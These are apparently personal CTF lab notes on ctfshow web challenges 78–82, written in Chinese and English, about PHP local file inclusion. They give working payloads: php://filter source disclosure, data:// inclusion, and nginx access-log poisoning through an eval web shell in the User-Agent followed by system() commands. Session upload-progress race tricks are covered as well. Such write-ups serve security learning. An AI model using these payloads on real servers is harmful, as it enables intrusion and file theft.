# Web 78
源码已给出，很明显就是要文件包含，但包含哪一个呢，需要尝试
```PHP
if(isset($_GET['file'])){
	$file = $_GET['file'];
	include($file);
}else{
	highlight_file(__FILE__);
}
```

先尝试 `?file=../../flag.php` 结果提示文件不能包含。

再尝试 `?file=flag.php` 结果 就什么也不显示（至少包含文件 已经成功），说明，有`flag.php`

这时，可使用`?file=php://filter/read=convert.base64-encode/resource=flag.php`

这时，显示出来一段`base64`代码 进行解码后。发现其中一段：

`$flag="ctfshow{6601f516-c571-468b-8c49-611a1f194f84}";`

原来`flag.php`只是赋了一个值 ，怪不得包含以后，页面什么也不显示。

至此，已获得`flag`
![[Pasted image 20241028223859.png]]

![[Pasted image 20241028223913.png]]
![[Pasted image 20241028224028.png]]
## XML External Entity (XXE)
There aren't any limitations for the references to the script of the Web Application, so that we can create an XML with external entities, which makes the server executes XXE.
- Some file readings;
- System commands executions;
- Inner-Net-port-explosions;
- Inner-Net port attacks.

## `php://filter`
https://www.leavesongs.com/PENETRATION/php-filter-magic.html
The unique protocol in `PHP`.
It is a unique protocol stream in the PHP language
The role is to act as an“Intermediary flow” to handle other flows.
Convert the POST content to Base64 encoding and output:
`readfile("php://filter/read=convert.base64-encode/resource=php://input");`
![[0f851469385893.png]]
### Use in XXE
[[XML#XXE Bug Utilization]]

# Web 79
![[Pasted image 20241103194436.png]]
Firstly, we need to translate the source code into Base64 text.
![[Pasted image 20241103194836.png]]
Secondly, we need to claim that my message is base64-encoded.
Thirdly, we need to claim that my message's [[#MIME]] type is the `text/plain`.
Fourthly, embed the data within the URL by using `data://`.
![[Pasted image 20241103195316.png]]
## Analysis

The payload you’ve provided is a URL query parameter that embeds base64-encoded plain text data directly within the URL using the data URL scheme. Here’s a breakdown of its components and what it means:

1. Payload Structure

`?file=data://text/plain;base64,{base64_encoded_string}`

	•	?file=: Indicates a query parameter named file in a URL.
	•	data://: Begins a data URL, which allows embedding data directly within the URL.
	•	text/plain: Specifies the MIME type of the data, indicating it’s plain text.
	•	base64: Signifies that the data is encoded in base64 format.
	•	{base64_encoded_string}: Represents the actual data encoded in base64.

2. Understanding the Components

a. Data URL Scheme

	•	The data URL scheme allows you to include small data items directly in a URL as if they were external resources.
	•	General syntax:

`data:[<MIME-type>][;charset=<encoding>][;base64],<data>`


	•	In your payload, it’s slightly modified with data://, but the concept remains similar.

b. Base64 Encoding

	•	Base64 encoding converts binary data into ASCII characters.
	•	Commonly used to transmit binary data over media designed to handle text.

3. Practical Interpretation

	•	Embedding Data: The payload is embedding data directly into the URL through the file parameter.
	•	Data Type: The data is plain text (text/plain) and base64-encoded.
	•	Usage: When the URL is processed, the application may decode the base64 string to retrieve the original text data.

4. Example Breakdown

Suppose the base64 string is `SGVsbG8sIFdvcmxkIQ==`, which decodes to “Hello, World!”.

Payload:

`?file=data://text/plain;base64,SGVsbG8sIFdvcmxkIQ==`

Interpretation:

	•	The application receiving this URL would decode the base64 string to get “Hello, World!” as plain text.
	•	This could be used to simulate a file’s contents being sent directly via the URL.

5. Potential Uses

	•	Data Transfer: Sending small amounts of data without needing external files.
	•	Testing: Developers might use such payloads to test how applications handle embedded data.
	•	API Requests: Some APIs might accept data URLs for uploading content.

6. Considerations

	•	URL Length Limitations: Browsers and servers have limits on URL lengths, so this method is suitable for small amounts of data.
	•	Security: Applications should properly validate and sanitize such inputs to prevent security vulnerabilities like injection attacks.
	•	Standard Compliance: The standard data URL scheme uses data: rather than data://. The double slashes may be a quirk of a specific application or framework.

7. Conclusion

The payload is a way to include base64-encoded plain text data directly in a URL parameter. When processed, it allows the application to access the embedded data as if it were reading from a file or external resource.

Note: Always ensure that any application handling such payloads implements proper security measures to handle the data safely.

## MIME
MIME stands for Multipurpose Internet Mail Extensions. It is an Internet standard that extends the format of email messages to support a wide variety of content types beyond plain text, enabling the transmission of:

	1.	Text in character sets other than ASCII: Allowing emails to include characters from various languages and scripts.
	2.	Attachments of audio, video, images, and application programs: Facilitating the inclusion of multimedia content and files within email messages.
	3.	Message bodies with multiple parts: Enabling the combination of different types of content in a single email, such as plain text and HTML versions.
	4.	Non-textual content: Supporting binary data and other non-text formats.

Key Points About MIME:

	•	MIME Types: MIME introduces the concept of “media types” (also known as MIME types) to specify the nature of a file or content. A MIME type consists of a type and a subtype, separated by a slash—for example, text/plain, image/jpeg, or application/json.
	•	Usage in Web Communications: While originally developed for email, MIME types are extensively used in web protocols like HTTP to indicate the type of content being transferred. Web servers include the Content-Type header in HTTP responses to inform clients (like web browsers) how to process the received data.
	•	Example:
	•	Content-Type: text/html: Indicates that the content is an HTML document.
	•	Content-Type: application/pdf: Indicates that the content is a PDF file.
	•	Encoding Mechanisms: MIME defines encoding methods like Base64 and quoted-printable to safely transmit binary data over text-based protocols that are not binary-safe.

Why MIME Matters:

	•	Interoperability: Ensures that emails and web content can be correctly interpreted and displayed across different platforms and email clients.
	•	Content Negotiation: Allows web clients and servers to negotiate and handle various content types, enhancing the flexibility and richness of web communications.
	•	Email Attachments: Enables the inclusion of attachments in emails by encoding binary files into a text-based format suitable for email transmission.

In Summary:

MIME is a crucial standard in Internet communications that enhances the basic format of emails and web content to support multiple content types, character sets, and attachments. It plays a vital role in how data is transmitted and understood across different systems on the Internet.
# Web 80
![[Pasted image 20241104080002.png]]
As we can see, the server is `nginx/1.20.1`
![[Pasted image 20241106214154.png]]
So, we can use log file of `nginx` as the including file.
1. Payload is the ``?file=/var/log/nginx/access.log&2=system('ls /var/www/html');phpinfo();``
2. Capture the package, then modify the ==User-Agent==.
	1. Append with `<?php eval($_GET[2]);?>`
![[Pasted image 20241106221911.png]]
We can see that there are 2 `php` files: `fl0g.php`, `index.php`.
Now, let's use the same way to display the `fl0g.php`:
1. Payload is `?file=/var/log/nginx/access.log&2=system(%27tac%20/var/www/html/fl0g.php%27);phpinfo();`
2. Capture the package, append `<?php eval($_GET[2]);?>` to the User-Agent.
![[Pasted image 20241106222506.png]]
![[Pasted image 20241106222717.png]]
# Web 81
1. Open BurpSuite Pro
2. Payload: `/?file=/var/log/nginx/access.log`
	1. ![[Pasted image 20241107204635.png]]
3. Append `<?php eval($_GET[2]); ?>` to the User-Agent.
4. `/?file=/var/log/nginx/access.log&2=system("ls /var/www/html");phpinfo();`
	1. ![[Pasted image 20241107210414.png]]
	2. Find the `fl0g.php`.
5. `/?file=/var/log/nginx/access.log&2=system("tac /var/www/html/fl0g.php");phpinfo();`
	1. ![[Pasted image 20241107210836.png]]
# Web 82
![[Pasted image 20241110013342.png]]

==https://blog.csdn.net/Myon5/article/details/140207360==
![[Pasted image 20241110013103.png]]

`a=system('ls');`
![[Pasted image 20241110013130.png]]
`a=system('tac fl0g.php');`
![[Pasted image 20241110013228.png]]


[Conditional competition vulnerability](https://www.freebuf.com/articles/web/275557.html)
[The tricks about utilizing the session](https://xz.aliyun.com/t/10662?u_atoken=c33c050f4136d18ba8a33076212b3268&u_asig=1a0c399f17311678125412522e00d5)

If the configurations are as follows, we can use `session.upload_progress` to write the hack command into the session files, so that we include the session files.
```
session.upload_progress.enabled = on
```
`enabled=on` Starts `upload_progress` feature.
When the browser uploading a file to the server, `PHP` will save the detail information (uploading time and the uploading progress) into the session.

```
session.upload_progress.prefix = "upload_progress_"
```
The key name in the session.

```
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
```
PHP will report the upload progress.

```
session.use_strict_mode = off
```
We can control the session ID in Cookies.

```
session.save_path = /var/lib/php/sessions
```
The file location of the session.

==But== there is another one configuration in file `php.ini`.
```
session.upload_progress.cleanup = on //表示当文件上传结束后，php将会立即清空对应session文件中的内容
```
session文件内容立即清空，清空了就没办法利用了。我们要想办法把session留在里面，所以就要利用条件竞争，在session文件内容清空前进行文件包含利用。
